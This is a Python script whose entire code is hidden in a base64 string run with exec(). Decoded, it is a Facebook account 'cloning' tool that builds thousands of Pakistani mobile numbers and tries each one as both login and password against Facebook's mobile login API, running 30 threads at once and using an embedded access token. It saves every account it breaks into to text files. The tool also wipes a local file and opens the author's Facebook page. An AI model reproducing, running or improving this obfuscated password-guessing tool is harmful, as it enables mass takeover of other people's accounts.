import base64
exec(base64.b64decode("IyBjb2Rpbmc6IHV0Zi04DQojIERlY29tcGlsZWQgQnkgWkVFIEJBTE9DSA0KIyBGQiBQQUdFIDogaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS9raGR4cnN1YnJhbmQNCiMgdW5jb21weWxlNiB2ZXJzaW9uIA0KIyBPcmlnaW5hbCB3cml0dGVuIEJ5IFpFRSBCQUxPQ0gNCmltcG9ydCBvcywgc3lzLCB0aW1lLCBkYXRldGltZSwgcmFuZG9tLCBoYXNobGliLCByZSwgdGhyZWFkaW5nLCBqc29uLCB1cmxsaWIsIGNvb2tpZWxpYiwgZ2V0cGFzcw0KX19hdXRob3JfXyA9ICdCQUxPQ0gnDQpfX2NvcHlyaWdodCA9ICdBbGwgcmlnaHRzIHJlc2VydmVkIC4gQ29weXJpZ2h0ICBaZWVzaGFuIEJhbG9jaCcNCkNvcnJlY3RVc2VybmFtZSA9ICdLSEQtMzAyJw0KQ29ycmVjdFBhc3N3b3JkID0gJ0tIRC0zMDInDQpvcy5zeXN0ZW0oJ2NsZWFyJykNCmxvb3AgPSAndHJ1ZScNCndoaWxlIChsb29wID09ICd0cnVlJyk6DQogICAgdXNlcm5hbWUgPSByYXdfaW5wdXQoJ1wwMzNbMTs5MW1FTlRFUiBUT09MIEtFWTpcblwwMzNbMTs5Mm0gJykNCiAgICBpZiAodXNlcm5hbWUgPT0gQ29ycmVjdFVzZXJuYW1lKToNCiAgICAgICAgICAgIHByaW50ICgnXDAzM1sxOzkybSBMb2dnZWQgaW4gc3VjY2Vzc2Z1bGx5IGFzICcpDQogICAgICAgICAgICB0aW1lLnNsZWVwKDEpDQogICAgICAgICAgICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vbS5mYWNlYm9vay5jb20va2hkeHJzdWJyYW5kJykNCiAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgICAgICAgICAgbG9vcCA9ICdmYWxzZScNCiAgICBlbHNlOg0KICAgICAgICBwcmludCAoJ1wwMzNbMTs5M20gV3JvbmcgS2V5ICEnKQ0KICAgICAgICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vbS5mYWNlYm9vay5jb20va2hkeHJzdWJyYW5kJykNCiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpDQpkb25lID0gRmFsc2UNCm9zLnN5c3RlbSgncm0gLXJmIC50eHQnKQ0KZm9yIG4gaW4gcmFuZ2UoNDAwMDApOg0KICAgIG5tYnIgPSByYW5kb20ucmFuZGludCgxMTExMTExLCA5OTk5OTk5KQ0KICAgIHN5cy5zdGRvdXQgPSBvcGVuKCcudHh0JywgJ2EnKQ0KICAgIHByaW50IChubWJyKQ0KICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KdHJ5Og0KICAgIGltcG9ydCByZXF1ZXN0cw0KZXhjZXB0IEltcG9ydEVycm9yOg0KICAgIG9zLnN5c3RlbSgncGlwMiBpbnN0YWxsIHJlcXVlc3RzJykNCnRyeToNCiAgICBpbXBvcnQgbWVjaGFuaXplDQpleGNlcHQgSW1wb3J0RXJyb3I6DQogICAgb3Muc3lzdGVtKCdwaXAyIGluc3RhbGwgbWVjaGFuaXplJykNCiAgICB0aW1lLnNsZWVwKDEpDQogICAgb3Muc3lzdGVtKCdweXRob24yIC5SRUFETUUubWQnKQ0KZnJvbSBtdWx0aXByb2Nlc3NpbmcucG9vbCBpbXBvcnQgVGhyZWFkUG9vbA0KZnJvbSByZXF1ZXN0cy5leGNlcHRpb25zIGltcG9ydCBDb25uZWN0aW9uRXJyb3INCmZyb20gbWVjaGFuaXplIGltcG9ydCBCcm93c2VyDQpyZWxvYWQoc3lzKQ0Kc3lzLnNldGRlZmF1bHRlbmNvZGluZygndXRmOCcpDQpiciA9IG1lY2hhbml6ZS5Ccm93c2VyKCkNCmJyLnNldF9oYW5kbGVfcm9ib3RzKEZhbHNlKQ0KYnIuc2V0X2hhbmRsZV9yZWZyZXNoKG1lY2hhbml6ZS5faHR0cC5IVFRQUmVmcmVzaFByb2Nlc3NvcigpLCBtYXhfdGltZT0xKQ0KYnIuYWRkaGVhZGVycyA9IFsoJ3VzZXItYWdlbnQnLCAnRGFsdmlrLzEuNi4wIChMaW51eDsgVTsgQW5kcm9pZCA0LjQuMjsgTlg1NSBCdWlsZC9LT1Q1NTA2KSBbRkJBTi9GQjRBO0ZCQVYvMTA2LjAuMC4yNi42ODtGQkJWLzQ1OTA0MTYwO0ZCRE0ve2RlbnNpdHk9My4wLHdpZHRoPTEwODAsaGVpZ2h0PTE5MjB9O0ZCTEMvaXRfSVQ7RkJSVi80NTkwNDE2MDtGQkNSL1Bvc3RlTW9iaWxlO0ZCTUYvYXN1cztGQkJEL2FzdXM7RkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCRFYvQVNVU19aMDBBRDtGQlNWLzUuMDtGQk9QLzE7RkJDQS94ODY6YXJtZWFiaS12N2E7XScpXQ0KZGVmIGV4YigpOg0KICAgIHByaW50ICgnWyFdIEV4aXQgU3VjY2Vzc2Z1bGx5ICcpDQogICAgb3Muc3lzLmV4aXQoKQ0KZGVmIGFjYWsoYik6DQogICAgdyA9ICdhaHRkempjJw0KICAgIGQgPSAnJw0KICAgIGZvciBpIGluIHg6DQogICAgICAgIGQgKz0gJyEnICsgd1tyYW5kb20ucmFuZGludCgwLCBsZW4odykgLSAxKV0gKyBpDQogICAgcmV0dXJuIGNldGFrKGQpDQpkZWYgY2V0YWsoYik6DQogICAgdyA9ICdhaHRkempjJw0KICAgIGZvciBpIGluIHc6DQogICAgICAgIGogPSB3LmluZGV4KGkpDQogICAgICAgIHggPSB4LnJlcGxhY2UoJyElcycgJSBpLCAnXHgxYlslczsxbScgJSBzdHIoMzEgKyBqKSkNCiAgICB4ICs9ICdceDFiWzBtJw0KICAgIHggPSB4LnJlcGxhY2UoJyEwJywgJ1x4MWJbMG0nKQ0KICAgIHN5cy5zdGRvdXQud3JpdGUoeCArICdcbicpDQpkZWYgamFsYW4oeCk6DQogICAgZm9yIGUgaW4geCArICdcbic6DQogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZSkNCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpDQogICAgICAgIHRpbWUuc2xlZXAoMy4wIC8gMjAwKQ0KZGVmIHRpaygpOg0KICAgIHRpdGlrID0gWycgICAnLCAnLiAnLCAnLi4gJywgJy4uLicsICcuICcsICcuLiAnLCAnLi4uJywgJyddDQogICAgZm9yIG8gaW4gdGl0aWs6DQogICAgICAgIHByaW50ICgnXHJceDFiWzE7OTZtIFx4MWJbMTs5Nm0gICAgICAgICAgICAgICBMb2FkXHgxYlsxOzk2bWluZ1x4MWJbMTswbVx4MWJbMTs5Nm0nKSArIG8sDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICB0aW1lLnNsZWVwKDAuNSkNCg0KICMjIyMjIExPR08gIyMjIyMgDQpsb2dvID0gIiIiDQoNClx4MWJbMTs5N204ODggICAgZDhQICAgODg4ICAgICAgIDg4OCAgICA4ODg4ODg4Yi4gICAgICAgIA0KXHgxYlsxOzk3bTg4OCAgIGQ4UCAgICA4ODggICAgICAgODg4ICAgIDg4OCAgICJZODhiICAgICAgIA0KXHgxYlsxOzk3bTg4ICBkOFAgICAgICA4ODggICAgICAgODg4ICAgIDg4OCAgICAgODg4ICAgICAgICAgICANClx4MWJbMTs5N204ODhkODhLICAgICAgODg4ODg4ODg4ODg4OCAgICA4ODggICAgIDg4OCAgICANClx4MWJbMTs5N204ODg4ODg4YiAgICAgODg4ICAgICAgIDg4OCAgICA4ODggICAgIDg4OCAgICAgIA0KXHgxYlsxOzk3bTg4OCAgWTg4YiAgICA4ODggICAgICAgODg4ICAgIDg4OCAgICAgODg4ICAgICAgDQpceDFiWzE7OTdtODg4ICAgWTg4YiAgIDg4OCAgICAgICA4ODggICAgODg4ICAgIGQ4OFAgICAgICAgDQpceDFiWzE7OTdtODg4ICAgIFk4OGIgIDg4OCAgICAgICA4ODggICAgODg4ODg4OFAiIDMwMg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KXHgxYlsxOzk3bS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpcMzNbMTs0MW0gICAgS0hELTMwMiBYIFJTVSBCUkFORCBSRUFMIEZBVEhFUiBPRiBISVRUTEVSICAgIFwzM1swbQ0KXHgxYlsxOzk3bS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpceDFiWzE7OTdtWytdIEFVVEhPUiAgICAgICAgIDogS0hEIDMwMiBCUkFORA0KXHgxYlsxOzk3bVsrXSBGQiBQQUdFLiAgICAgICA6IFpFRSBCQUxPQ0gNClx4MWJbMTs5N21bK10gR0lUSFVCLiAgICAgICAgOiBLSERGT1VOREVSICAgDQpceDFiWzE7OTdtWytdIFRFQU0uICAgICAgICAgIDpcMzNbMTs0Mm0gUlNVX0ZBTUlMWSBcMzNbMG0NClx4MWJbMTs5N21bK10gVkVSU0lPTiAgICAgICAgOlx4MWJbMTs5N20gMC4xICBceDFiWzE7OTdtICAgICAgICAgIA0KXHgxYlsxOzk3bS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIiIiANCmxvZ28xID0gJyAgIFxuXG5ceDFiWzQ7OTdtU0VMRUNUIFBBSyAgU0lNIENPREUgXHgxYlsxOzBtXG5ceDFiWzE7OTZtWzFdIEphenogICAgXHgxYlsxOzk3bSAwMCwwMSwwMiwwMywwNCwwNSwwNiwwNywwOFxuXHgxYlsxOzk2bVsyXSBab25nICAgIFx4MWJbMTs5N20gMTEsMTIsMTMsMTQsMTUsMTYsMTdcblx4MWJbMTs5Nm1bM10gV2FyaWQgICBceDFiWzE7OTdtIDIxLDIyLDIzLDI0LDI1XG5ceDFiWzE7OTZtWzRdIFVmb25lICAgXHgxYlsxOzk3bSAzMCwzMSwzMiwzMywzNCwzNVxuXHgxYlsxOzk2bVs1XSBUZWxlbm9yIFx4MWJbMTs5N20gNDAsNDEsNDIsNDMsNDQsNDUsNDYsNDdcblxuXG5cblx4MWJ4IFx4MWJbMTs5N21ceDFiWzE7MG1cbicNCg0KYmFjayA9IDANCmJlcmhhc2lsID0gW10NCmNla3BvaW50ID0gW10NCm9rcyA9IFtdDQppZCA9IFtdDQpjcGIgPSBbXQ0KZGVmIG1lbnUoKToNCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICBwcmludCAobG9nbykNCiAgICBwcmludCg1MSonLScpDQogICAgcHJpbnQNCiAgICBqYWxhbiAoJ1x4MWJbMTs5Mm1bMV0gU1RBUlQgUmFuZG9tIE51bWJlciBDbG9uaW5nICcpDQogICAgcHJpbnQoNTEqJy0nKQ0KICAgIGFjdGlvbigpDQpkZWYgYWN0aW9uKCk6DQogICAgZ2xvYmFsIGNwYg0KICAgIGdsb2JhbCBva3MNCiAgICBzcyA9IHJhd19pbnB1dCgnXHgxYlsxOzk2bXNlbGVjdCBPcHRvaW4gPSAgICcpDQogICAgaWYgc3MgPT0gJyc6DQogICAgICAgIHByaW50ICgnWyFdIFdhcm5pbmcnKQ0KICAgICAgICBhY3Rpb24oKQ0KICAgIGVsaWYgc3MgPT0gJzEnOg0KICAgICAgICB0aWsoKQ0KICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICAgICAgcHJpbnQgKGxvZ28pDQogICAgICAgIHByaW50IChsb2dvMSkNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgYyA9IHJhd19pbnB1dCgnXHgxYlsxOzk3bUNPREUgOiAnKQ0KICAgICAgICAgICAgayA9ICcwMycNCiAgICAgICAgICAgIGlkbGlzdCA9ICcudHh0Jw0KICAgICAgICAgICAgZm9yIGxpbmUgaW4gb3BlbihpZGxpc3QsICdyJykucmVhZGxpbmVzKCk6DQogICAgICAgICAgICAgICAgaWQuYXBwZW5kKGxpbmUuc3RyaXAoKSkNCiAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgICBwcmludCAoJ1shXSBGaWxlIE5vdCBGb3VuZCcpDQogICAgICAgICAgICByYXdfaW5wdXQoJ1xuWyBCYWNrIF0nKQ0KICAgICAgICAgICAgbWVudSgpDQogICAgZWxpZiBzcyA9PSAnMCc6DQogICAgICAgIGV4YigpDQogICAgICAgIGxvZ2luKCkNCiAgICBlbHNlOg0KICAgICAgICBwcmludCAoJ1shXSBGaWxsIEluIENvcnJlY3RseScpDQogICAgICAgIGFjdGlvbigpDQoNCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICBwcmludCAobG9nbykNCg0KICAgIGphbGFuICgnXHgxYlsxOzk3bUtJTEFESTMwMiBYIFJTVSBGT1VOREVSIFpFU0hBTiBCQUxPQ0ggQlJBTkQnKQ0KICAgIHByaW50KDUxKictJykNCiAgICB4eHggPSBzdHIobGVuKGlkKSkNCiAgICBqYWxhbignXHgxYlsxOzk3bVsrXVRPVEFMIElEUyA6XHgxYlsxOzk3bSAnICsgeHh4ICkNCiAgICBwcmludCgiXDAzM1swOzk3bVsrXSBOT1RFOiBDUCBJRFogT1BFTiBJTiAxNSBEQVlTIikNCiAgICBwcmludCgiWyFdIH5Vc2UgRmxpZ2h0IE1vZGUgNSBTZWNvbmQgQWZ0ZXIgRXZlcnkgMTAgbWludH4iKQ0KICAgIHByaW50KDUxKictJykNCiAgICBkZWYgbWFpbihhcmcpOg0KICAgICAgICB1c2VyID0gYXJnDQogICAgICAgIHRyeToNCiAgICAgICAgICAgIG9zLm1rZGlyKCdzYXZlJykNCiAgICAgICAgZXhjZXB0IE9TRXJyb3I6DQogICAgICAgICAgICBwYXNzDQogICAgICAgIHRyeToNCiAgICAgICAgICAgIHBhc3MxID0gdXNlcg0KICAgICAgICAgICAgZGF0YSA9IGJyLm9wZW4oJ2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MSZlbWFpbD0nICsgayArIGMgKyB1c2VyICsgJyZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9JyArIHBhc3MxICsgJyZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OGZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmbScpDQogICAgICAgICAgICBxID0ganNvbi5sb2FkKGRhdGEpDQogICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOg0KDQogICAgICAgICAgICAgICAgcHJpbnQgKCdceDFiWzkybSAgS0hEMzAyLU9LICAnKSArIGsgKyBjICsgdXNlciArICcgIHwgICcgKyBwYXNzMQ0KICAgICAgICAgICAgICAgIG9rYiA9IG9wZW4oJ3NhdmUvQ1AudHh0JywgJ2EnKQ0KICAgICAgICAgICAgICAgIG9rYi53cml0ZShrICsgYyArIHVzZXIgKyBwYXNzMSArICdcbicpDQogICAgICAgICAgICAgICAgb2tiLmNsb3NlKCkNCiAgICAgICAgICAgICAgICBva3MuYXBwZW5kKGMgKyB1c2VyICsgcGFzczEpDQoNCiAgICAgICAgICAgIGVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbJ2Vycm9yX21zZyddOg0KDQogICAgICAgICAgICAgICAgcHJpbnQgKCdceDFiWzE7OTFtICBLSEQzMDItQ1AgJykgKyBrICsgYyArIHVzZXIgKyAnICB8ICAnICsgcGFzczENCiAgICAgICAgICAgICAgICBjcHMgPSBvcGVuKCdzYXZlL0NQLnR4dCcsICdhJykNCiAgICAgICAgICAgICAgICBjcHMud3JpdGUoayArIGMgKyB1c2VyICsgcGFzczEgKyAnXG4nKQ0KICAgICAgICAgICAgICAgIGNwcy5jbG9zZSgpDQogICAgICAgICAgICAgICAgY3BiLmFwcGVuZChjICsgdXNlciArIHBhc3MxKQ0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBwYXNzMiA9IGsgKyBjICsgdXNlcg0KICAgICAgICAgICAgICAgIGRhdGEgPSBici5vcGVuKCdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTEmZW1haWw9JyArIGsgKyBjICsgdXNlciArICcmbG9jYWxlPWVuX1VTJnBhc3N3b3JkPScgKyBwYXNzMiArICcmc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOThmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZm0nKQ0KICAgICAgICAgICAgICAgIHEgPSBqc29uLmxvYWQoZGF0YSkNCiAgICAgICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOg0KICAgICAgICAgICAgICAgICAgICBwcmludCAoJ1x4MWJbMTs5Mm0gIEtIRDMwMi1PSyAnKSArIGsgKyBjICsgdXNlciArICcgIHwgICcgKyBwYXNzMg0KICAgICAgICAgICAgICAgICAgICBva2IgPSBvcGVuKCdzYXZlL09LLnR4dCcsICdhJykNCiAgICAgICAgICAgICAgICAgICAgb2tiLndyaXRlKGsgKyBjICsgdXNlciArIHBhc3MyICsgJ1xuJykNCiAgICAgICAgICAgICAgICAgICAgb2tiLmNsb3NlKCkNCiAgICAgICAgICAgICAgICAgICAgb2tzLmFwcGVuZChjICsgdXNlciArIHBhc3MyKQ0KICAgICAgICAgICAgICAgIGVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbJ2Vycm9yX21zZyddOg0KICAgICAgICAgICAgICAgICAgICBwcmludCAoJ1x4MWJbMTs5MW0gIEtIRDMwMi1DUCAnKSArIGsgKyBjICsgdXNlciArICcgIHwgICcgKyBwYXNzMg0KICAgICAgICAgICAgICAgICAgICBjcHMgPSBvcGVuKCdzYXZlL0NQLnR4dCcsICdhJykNCiAgICAgICAgICAgICAgICAgICAgY3BzLndyaXRlKGsgKyBjICsgdXNlciArIHBhc3MyICsgJ1xuJykNCiAgICAgICAgICAgICAgICAgICAgY3BzLmNsb3NlKCkNCiAgICAgICAgICAgICAgICAgICAgY3BiLmFwcGVuZChjICsgdXNlciArIHBhc3MyKQ0KICAgICAgICAgICAgICAgIA0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwYXNzDQogICAgcCA9IFRocmVhZFBvb2woMzApDQogICAgcC5tYXAobWFpbiwgaWQpDQogICAgcHJpbnQoNDgqIi0iKQ0KICAgIHByaW50ICgnUHJvY2VzcyBIYXMgQmVlbiBDb21wbGV0ZWQgLi4uJykNCiAgICBwcmludCAoJ1RvdGFsIE9LIDogJykgKyBzdHIobGVuKG9rcykpDQogICAgcHJpbnQgKCdUb3RhbCBDUCA6ICcpICsgc3RyKGxlbihjcGIpKQ0KICAgIHByaW50KDQ3KiItIikNCiAgICBwcmludCAoJ0Nsb25lZCBBY2NvdW50cyBIYXMgQmVlbiBTYXZlZCA6IHNhdmUvY2xvbmVkLnR4dCcpDQogICAgamFsYW4oJ05vdGUgOiBDcCBhY2NvdW50ICAxMCBzYXkgMTIgZGF5cyBCQUQgT1BFTiBLUlknKQ0KICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTVtW1x4MWJbMTs5OG1NZXRvb19tZW51X0JhY2tceDFiWzE7OTVtXScpDQogICAgbG9naW4oKQ0KaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoNCg0KDQogICAgbWVudSgpDQo="))